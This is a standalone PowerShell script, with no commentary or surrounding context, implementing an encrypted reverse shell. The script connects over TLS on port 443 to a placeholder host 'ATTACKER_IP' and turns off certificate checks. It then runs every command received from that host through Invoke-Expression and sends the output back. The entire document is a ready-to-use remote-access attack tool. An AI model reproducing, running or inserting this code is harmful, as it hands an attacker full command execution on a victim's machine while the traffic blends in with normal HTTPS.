Add-Type @"
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy {
    public static bool IgnoreCertValidation(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
        return true;
    }
}
"@

$tcp = New-Object Net.Sockets.TcpClient("ATTACKER_IP",443)
$stream = $tcp.GetStream()

$ssl = New-Object Net.Security.SslStream($stream,$false,
    [System.Net.Security.RemoteCertificateValidationCallback]{
        param ($sender, $cert, $chain, $sslPolicyErrors)
        return $true
    })

$ssl.AuthenticateAsClient("fakehost")

$writer = New-Object IO.StreamWriter($ssl)
$writer.AutoFlush = $true
$reader = New-Object IO.StreamReader($ssl)

while ($true) {
    $writer.Write("PS " + (Get-Location).Path + "> ")
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") { break }
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
    } catch {
        $output = $_.Exception.Message
    }
    $writer.WriteLine($output)
}
$ssl.Close()
$tcp.Close()
